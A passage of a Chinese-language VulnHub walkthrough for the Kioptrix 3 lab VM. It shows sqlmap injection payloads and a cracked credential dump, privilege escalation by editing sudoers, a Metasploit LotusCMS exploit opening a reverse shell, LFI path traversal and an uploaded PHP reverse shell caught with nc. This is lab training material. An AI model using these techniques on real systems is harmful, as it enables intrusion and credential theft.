the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: id (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: Boolean-based blind - Parameter replace (original value)</span></span><br><span class="line"><span class="string">    Payload: id=(SELECT (CASE WHEN (5293=5293) THEN 1 ELSE (SELECT 1341 UNION SELECT 9380) END))&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: id=1 OR ROW(1324,2762)&gt;(SELECT COUNT(*),CONCAT(0x7171766a71,(SELECT (ELT(1324=1324,1))),0x7170786a71,FLOOR(RAND(0)*2))x FROM (SELECT 8520 UNION SELECT 1582 UNION SELECT 8916 UNION SELECT 1258)a GROUP BY x)&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: id=1 AND (SELECT 4741 FROM (SELECT(SLEEP(5)))vtbf)&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: id=1 UNION ALL SELECT CONCAT(0x7171766a71,0x4d67454a425a6e796b5745656b794f584a4348714c79624d4255416243444967494975507875524d,0x7170786a71),NULL,NULL,NULL,NULL,NULL-- TpfQ&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Parameter: sort (GET)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: id=1&amp;sort=photoid AND (SELECT 4185 FROM (SELECT(SLEEP(5)))Gmzf)</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">there were multiple injection points, please select the one to use for following injections:</span></span><br><span class="line"><span class="string">[0] place: GET, parameter: id, type: Unescaped numeric (default)</span></span><br><span class="line"><span class="string">[1] place: GET, parameter: sort, type: Unescaped numeric</span></span><br><span class="line"><span class="string">[q] Quit</span></span><br><span class="line"><span class="string">[04:14:34] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[04:14:34] [WARNING] HTTP error codes detected during run:</span></span><br><span class="line"><span class="string">500 (Internal Server Error) - 1 times</span></span><br><span class="line"><span class="string">[04:14:34] [INFO] fetched data logged to text files under &#x27;</span>/root/.sqlmap/output/kioptrix3.com<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 04:14:34 /2019-12-13/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt -D gallery -T dev_accounts --dump</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                           </span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.3.12<span class="comment">#stable&#125;                                                              </span></span><br><span class="line">|_ -| . [<span class="string">&quot;]     | .&#x27;| . |                                                                              </span></span><br><span class="line"><span class="string">|___|_  [(]_|_|_|__,|  _|                                                                              </span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org                                                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 04:18:17 /2019-12-13/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[04:18:17] [INFO] parsing HTTP request from &#x27;sqlmap.txt&#x27;</span></span><br><span class="line"><span class="string">[04:18:17] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[04:18:17] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[04:18:18] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: id (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: Boolean-based blind - Parameter replace (original value)</span></span><br><span class="line"><span class="string">    Payload: id=(SELECT (CASE WHEN (5293=5293) THEN 1 ELSE (SELECT 1341 UNION SELECT 9380) END))&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: id=1 OR ROW(1324,2762)&gt;(SELECT COUNT(*),CONCAT(0x7171766a71,(SELECT (ELT(1324=1324,1))),0x7170786a71,FLOOR(RAND(0)*2))x FROM (SELECT 8520 UNION SELECT 1582 UNION SELECT 8916 UNION SELECT 1258)a GROUP BY x)&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: id=1 AND (SELECT 4741 FROM (SELECT(SLEEP(5)))vtbf)&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: id=1 UNION ALL SELECT CONCAT(0x7171766a71,0x4d67454a425a6e796b5745656b794f584a4348714c79624d4255416243444967494975507875524d,0x7170786a71),NULL,NULL,NULL,NULL,NULL-- TpfQ&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Parameter: sort (GET)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: id=1&amp;sort=photoid AND (SELECT 4185 FROM (SELECT(SLEEP(5)))Gmzf)</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">there were multiple injection points, please select the one to use for following injections:</span></span><br><span class="line"><span class="string">[0] place: GET, parameter: id, type: Unescaped numeric (default)</span></span><br><span class="line"><span class="string">[1] place: GET, parameter: sort, type: Unescaped numeric</span></span><br><span class="line"><span class="string">[q] Quit</span></span><br><span class="line"><span class="string">[04:18:18] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[04:18:18] [INFO] fetching columns for table &#x27;dev_accounts&#x27; in database &#x27;gallery&#x27;</span></span><br><span class="line"><span class="string">[04:18:18] [INFO] used SQL query returns 3 entries</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] used SQL query returns 3 entries                                                    </span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;id&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;int(10)&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;username&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;varchar(50)&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;password&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;varchar(50)&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] fetching entries for table &#x27;dev_accounts&#x27; in database &#x27;gallery&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] used SQL query returns 2 entries</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;1&#x27;,&#x27;0d3eccfb887aabd50f243b3f155c0f85&#x27;,&#x27;dreg&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [WARNING] automatically patching output having last char trimmed</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;2&#x27;,&#x27;5badcaf789d3d1d09794d8f021f40f0e&#x27;,&#x27;loneferret&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] recognized possible password hashes in column &#x27;password&#x27;                            </span></span><br><span class="line"><span class="string">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y</span></span><br><span class="line"><span class="string">[04:18:22] [INFO] writing hashes to a temporary file &#x27;/tmp/sqlmapa2cskfzq12456/sqlmaphashes-0oyz7rlz.txt&#x27;                                                                                                     </span></span><br><span class="line"><span class="string">do you want to crack them via a dictionary-based attack? [Y/n/q] y</span></span><br><span class="line"><span class="string">[04:18:28] [INFO] using hash method &#x27;md5_generic_passwd&#x27;</span></span><br><span class="line"><span class="string">what dictionary do you want to use?</span></span><br><span class="line"><span class="string">[1] default dictionary file &#x27;/usr/share/sqlmap/data/txt/wordlist.tx_&#x27; (press Enter)</span></span><br><span class="line"><span class="string">[2] custom dictionary file</span></span><br><span class="line"><span class="string">[3] file with list of dictionary files</span></span><br><span class="line"><span class="string">&gt; 1</span></span><br><span class="line"><span class="string">[04:18:31] [INFO] using default dictionary</span></span><br><span class="line"><span class="string">do you want to use common password suffixes? (slow!) [y/N] y</span></span><br><span class="line"><span class="string">[04:18:34] [INFO] starting dictionary-based cracking (md5_generic_passwd)</span></span><br><span class="line"><span class="string">[04:18:34] [INFO] starting 4 processes </span></span><br><span class="line"><span class="string">[04:18:39] [INFO] cracked password &#x27;starwars&#x27; for user &#x27;loneferret&#x27;                                   </span></span><br><span class="line"><span class="string">[04:18:40] [INFO] cracked password &#x27;Mast3r&#x27; for user &#x27;dreg&#x27;                                           </span></span><br><span class="line"><span class="string">Database: gallery                                                                                     </span></span><br><span class="line"><span class="string">Table: dev_accounts</span></span><br><span class="line"><span class="string">[2 entries]</span></span><br><span class="line"><span class="string">+----+---------------------------------------------+------------+</span></span><br><span class="line"><span class="string">| id | password                                    | username   |</span></span><br><span class="line"><span class="string">+----+---------------------------------------------+------------+</span></span><br><span class="line"><span class="string">| 1  | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   | dreg       |</span></span><br><span class="line"><span class="string">| 2  | 5badcaf789d3d1d09794d8f021f40f0e (starwars) | loneferret |</span></span><br><span class="line"><span class="string">+----+---------------------------------------------+------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[04:18:42] [INFO] table &#x27;gallery.dev_accounts&#x27; dumped to CSV file &#x27;/root/.sqlmap/output/kioptrix3.com/dump/gallery/dev_accounts.csv&#x27;                                                                          </span></span><br><span class="line"><span class="string">[04:18:42] [WARNING] HTTP error codes detected during run:</span></span><br><span class="line"><span class="string">500 (Internal Server Error) - 1 times</span></span><br><span class="line"><span class="string">[04:18:42] [INFO] fetched data logged to text files under &#x27;/root/.sqlmap/output/kioptrix3.com&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 04:18:42 /2019-12-13/</span></span><br></pre></td></tr></table></figure>
<p>直接用sqlmap跑出账号密码，还省去了将hash拿去解密的麻烦。之后使用这两个密码直接连接ssh即可。</p>
<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>ssh连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh loneferret@192.168.84.144</span></span><br><span class="line">loneferret@192.168.84.144<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Ubuntu system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span></span><br><span class="line"><span class="string">applicable law.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">To access official Ubuntu documentation, please visit:</span></span><br><span class="line"><span class="string">http://help.ubuntu.com/</span></span><br><span class="line"><span class="string">Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106</span></span><br><span class="line"><span class="string">loneferret@Kioptrix3:~$ ls</span></span><br><span class="line"><span class="string">checksec.sh  CompanyPolicy.README</span></span><br><span class="line"><span class="string">loneferret@Kioptrix3:~$ id</span></span><br><span class="line"><span class="string">uid=1000(loneferret) gid=100(users) groups=100(users)</span></span><br><span class="line"><span class="string">loneferret@Kioptrix3:~$ pwd</span></span><br><span class="line"><span class="string">/home/loneferret</span></span><br><span class="line"><span class="string">loneferret@Kioptrix3:~$ whoami</span></span><br><span class="line"><span class="string">loneferret</span></span><br><span class="line"><span class="string">loneferret@Kioptrix3:~$ sudo -l</span></span><br><span class="line"><span class="string">User loneferret may run the following commands on this host:</span></span><br><span class="line"><span class="string">    (root) NOPASSWD: !/usr/bin/su</span></span><br><span class="line"><span class="string">    (root) NOPASSWD: /usr/local/bin/ht</span></span><br></pre></td></tr></table></figure>

<p>可以看到当前登录的用户具有xterm-256color文本编辑器的sudo权限。 最初，我们可以尝试编辑/etc/sudoers文件，以便提升特权-为此，我们就开始吧！<br>如果由于某种原因在尝试运行sudo ht时出现错误，则只需像下面所做的那样将xtrem-color导出为TERM。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo ht /etc/sudoers </span><br><span class="line">Error opening terminal: xterm-256color.</span><br><span class="line">loneferret@Kioptrix3:~$ <span class="built_in">export</span> TERM=xterm-color</span><br><span class="line">loneferret@Kioptrix3:~$ sudo ht /etc/sudoers</span><br></pre></td></tr></table></figure>

<p>可以看到这样打开sudoers文件。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub49.jpg"></p>
<p>从这里按F3，然后输入/etc/sudoers,回车,再下图中的位置输入[, /bin/sh]，然后F10选择yes然后保存。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub50.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub51.jpg"></p>
<p>输入下面命令，成功由普通用户变为root用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo /bin/sh</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/home/loneferret</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># cat Congrats.txt</span></span><br><span class="line">Good <span class="keyword">for</span> you <span class="keyword">for</span> getting here.</span><br><span class="line">Regardless of the matter (staying within the spirit of the game of course)</span><br><span class="line">you got here, congratulations are <span class="keyword">in</span> order. Wasn<span class="string">&#x27;t that bad now was it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Went in a different direction with this VM. Exploit based challenges are</span></span><br><span class="line"><span class="string">nice. Helps workout that information gathering part, but sometimes we</span></span><br><span class="line"><span class="string">need to get our hands dirty in other things as well.</span></span><br><span class="line"><span class="string">Again, these VMs are beginner and not intented for everyone. </span></span><br><span class="line"><span class="string">Difficulty is relative, keep that in mind.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The object is to learn, do some research and have a little (legal)</span></span><br><span class="line"><span class="string">fun in the process.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I hope you enjoyed this third challenge.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Steven McElrea</span></span><br><span class="line"><span class="string">aka loneferret</span></span><br><span class="line"><span class="string">http://www.kioptrix.com</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Credit needs to be given to the creators of the gallery webapp and CMS used</span></span><br><span class="line"><span class="string">for the building of the Kioptrix VM3 site.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Main page CMS: </span></span><br><span class="line"><span class="string">http://www.lotuscms.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Gallery application: </span></span><br><span class="line"><span class="string">Gallarific 2.1 - Free Version released October 10, 2009</span></span><br><span class="line"><span class="string">http://www.gallarific.com</span></span><br><span class="line"><span class="string">Vulnerable version of this application can be downloaded</span></span><br><span class="line"><span class="string">from the Exploit-DB website:</span></span><br><span class="line"><span class="string">http://www.exploit-db.com/exploits/15891/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The HT Editor can be found here:</span></span><br><span class="line"><span class="string">http://hte.sourceforge.net/downloads.html</span></span><br><span class="line"><span class="string">And the vulnerable version on Exploit-DB here:</span></span><br><span class="line"><span class="string">http://www.exploit-db.com/exploits/17083/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Also, all pictures were taken from Google Images, so being part of the</span></span><br><span class="line"><span class="string">public domain I used them.</span></span><br></pre></td></tr></table></figure>

<p>至此挑战完成。</p>
<h3 id="更多方法"><a href="#更多方法" class="headerlink" title="更多方法"></a>更多方法</h3><ul>
<li>利用LotusCMS 3.0 eval（）远程命令执行漏洞</li>
</ul>
<p>使用msf中的exploit/multi/http/lcms_php_exec模块可以直接getshell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfdb run</span></span><br><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line"><span class="comment"># cowsay++</span></span><br><span class="line"> ____________</span><br><span class="line">&lt; metasploit &gt;</span><br><span class="line"> ------------</span><br><span class="line">       \   ,__,</span><br><span class="line">        \  (oo)____</span><br><span class="line">           (__)    )\</span><br><span class="line">              ||--|| *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.63-dev                          ]</span><br><span class="line">+ -- --=[ 1951 exploits - 1091 auxiliary - 334 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/multi/http/lcms_php_exec</span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; <span class="built_in">set</span> RHOSTS 192.168.84.144</span><br><span class="line">RHOSTS =&gt; 192.168.84.144</span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; <span class="built_in">set</span> payload generic/shell_reverse_tcp                                                                                                                                                             </span><br><span class="line">payload =&gt; generic/shell_reverse_tcp                                                                                                                                                                                                       </span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; <span class="built_in">set</span> LHOST 192.168.84.135</span><br><span class="line">LHOST =&gt; 192.168.84.135                                                                                                                                                                                                                    </span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; <span class="built_in">set</span> URI /                                                                                                                                                                                         </span><br><span class="line">URI =&gt; /</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.84.135:4444 </span><br><span class="line">[*] Using found page param: /index.php?page=index</span><br><span class="line">[*] Sending exploit ...</span><br><span class="line">[*] Command shell session 2 opened (192.168.84.135:4444 -&gt; 192.168.84.144:57666) at 2019-12-14 06:18:03 -0500</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<p>成功getshell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -la gallery/</span><br><span class="line">total 164</span><br><span class="line">drwxr-xr-x 7 root root  4096 Apr 14  2011 .</span><br><span class="line">drwxr-xr-x 8 root root  4096 Apr 15  2011 ..</span><br><span class="line">drwxr-xr-x 2 root root  4096 Apr 12  2011 BACK</span><br><span class="line">-rw-r--r-- 1 root root  3573 Oct 10  2009 db.sql</span><br><span class="line">-rw-r--r-- 1 root root   252 Apr 12  2011 g.php</span><br><span class="line">drwxr-xr-x 3 root root  4096 Apr 12  2011 gadmin</span><br><span class="line">-rw-r--r-- 1 root root   214 Apr 12  2011 gallery.php</span><br><span class="line">-rw-r--r-- 1 root root  1440 Apr 14  2011 gconfig.php</span><br><span class="line">-rw-r--r-- 1 root root   297 Apr 12  2011 gfooter.php</span><br><span class="line">-rw-r--r-- 1 root root 38771 Apr 12  2011 gfunctions.php</span><br><span class="line">-rw-r--r-- 1 root root  1009 Apr 12  2011 gheader.php</span><br><span class="line">-rw-r--r-- 1 root root   249 Apr 12  2011 index.php</span><br><span class="line">-rw-r--r-- 1 root root 10340 Apr 12  2011 install.BAK</span><br><span class="line">-rw-r--r-- 1 root root   212 Apr 12  2011 login.php</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 logout.php</span><br><span class="line">-rw-r--r-- 1 root root   249 Apr 12  2011 p.php</span><br><span class="line">drwxrwxrwx 2 root root  4096 Apr 12  2011 photos</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 photos.php</span><br><span class="line">-rw-r--r-- 1 root root   219 Apr 12  2011 post_comment.php</span><br><span class="line">-rw-r--r-- 1 root root   214 Apr 12  2011 profile.php</span><br><span class="line">-rw-r--r-- 1 root root    87 Oct 10  2009 readme.html</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 recent.php</span><br><span class="line">-rw-r--r-- 1 root root   215 Apr 12  2011 register.php</span><br><span class="line">drwxr-xr-x 2 root root  4096 Apr 13  2011 scopbin</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 search.php</span><br><span class="line">-rw-r--r-- 1 root root   216 Apr 12  2011 slideshow.php</span><br><span class="line">-rw-r--r-- 1 root root   211 Apr 12  2011 tags.php</span><br><span class="line">drwxr-xr-x 6 root root  4096 Apr 12  2011 themes</span><br><span class="line">-rw-r--r-- 1 root root    56 Oct 10  2009 version.txt</span><br><span class="line">-rw-r--r-- 1 root root   211 Apr 12  2011 vote.php</span><br></pre></td></tr></table></figure>

<p>在gallery目录下发现phpmyadmin配置文件中的phpmyadmin的用户名和密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat gallery/gconfig.php</span><br><span class="line">&lt;?php</span><br><span class="line">        error_reporting(0);</span><br><span class="line">        /*</span><br><span class="line">                A sample Gallarific configuration file. You should edit</span><br><span class="line">                the installer details below and save this file as gconfig.php</span><br><span class="line">                Do not modify anything <span class="keyword">else</span> <span class="keyword">if</span> you don<span class="string">&#x27;t know what it is.</span></span><br><span class="line"><span class="string">        */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Installer Details -----------------------------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Enter the full HTTP path to your Gallarific folder below,</span></span><br><span class="line"><span class="string">        // such as http://www.yoursite.com/gallery</span></span><br><span class="line"><span class="string">        // Do NOT include a trailing forward slash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $GLOBALS[&quot;gallarific_path&quot;] = &quot;http://kioptrix3.com/gallery&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $GLOBALS[&quot;gallarific_mysql_server&quot;] = &quot;localhost&quot;;</span></span><br><span class="line"><span class="string">        $GLOBALS[&quot;gallarific_mysql_database&quot;] = &quot;gallery&quot;;</span></span><br><span class="line"><span class="string">        $GLOBALS[&quot;gallarific_mysql_username&quot;] = &quot;root&quot;;</span></span><br><span class="line"><span class="string">        $GLOBALS[&quot;gallarific_mysql_password&quot;] = &quot;fuckeyou&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Setting Details -------------------------------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if(!$g_mysql_c = @mysql_connect($GLOBALS[&quot;gallarific_mysql_server&quot;], $GLOBALS[&quot;gallarific_mysql_username&quot;], $GLOBALS[&quot;gallarific_mysql_password&quot;])) &#123;</span></span><br><span class="line"><span class="string">                echo(&quot;A connection to the database couldn&#x27;</span>t be established: <span class="string">&quot; . mysql_error());</span></span><br><span class="line"><span class="string">                die();</span></span><br><span class="line"><span class="string">&#125;else &#123;</span></span><br><span class="line"><span class="string">        if(!<span class="variable">$g_mysql_d</span> = @mysql_select_db(<span class="variable">$GLOBALS</span>[&quot;</span>gallarific_mysql_database<span class="string">&quot;], <span class="variable">$g_mysql_c</span>)) &#123;</span></span><br><span class="line"><span class="string">                echo(&quot;</span>The Gallarific database couldn<span class="string">&#x27;t be opened: &quot; . mysql_error());</span></span><br><span class="line"><span class="string">                die();</span></span><br><span class="line"><span class="string">        &#125;else &#123;</span></span><br><span class="line"><span class="string">                $settings=mysql_query(&quot;select * from gallarific_settings&quot;);</span></span><br><span class="line"><span class="string">                if(mysql_num_rows($settings)!=0)&#123;</span></span><br><span class="line"><span class="string">                        while($data=mysql_fetch_array($settings))&#123;</span></span><br><span class="line"><span class="string">                                $GLOBALS[&quot;&#123;$data[&#x27;</span>settings_name<span class="string">&#x27;]&#125;&quot;]=$data[&#x27;</span>settings_value<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现phpmyadmin的用户名密码：root/fuckeyou，直接登录然后getshell</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub52.jpg"></p>
<p>具体参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9kZGQ0MWI4NDFjMzY=">phpmyadmin getshell<i class="fa fa-external-link-alt"></i></span></p>
<ul>
<li>LFI漏洞组合利用</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.84.144/index.php?system=../../../../../../../etc/passwd%00.html</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub53.jpg"></p>
<p>使用之前的sql注入得到admin的密码下图所示登录</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub54.jpg"></p>
<p>将php reverse shell木马后缀改成.jpg上传，然后右键得到图片的链接</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub55.jpg"></p>
<p>浏览器访问</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.84.144/index.php?system=../../../../../../../home/www/kioptrix3.com/gallery/photos/x281lo68jw.jpg%00.html</span><br></pre></td></tr></table></figure>

<p>同时kali端nc监听成功返回shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">connect to [192.168.84.135] from kioptrix3.com [192.168.84.144] 37790</span><br><span class="line">Linux Kioptrix3 2.6.24-24-server <span class="comment">#1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux</span></span><br><span class="line"> 15:10:15 up  2:59,  1 user,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">loneferr pts/0    192.168.84.135   12:27   21:13m  4.66s  0.01s sshd: loneferre</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">/</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure>
<p>6的一批！！！！！！</p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="red"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Lampiao-1]</title>
    <url>/2020/04/07/Lampiao-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：Lampião: 1<br>发布日期：2018年7月28日</p>
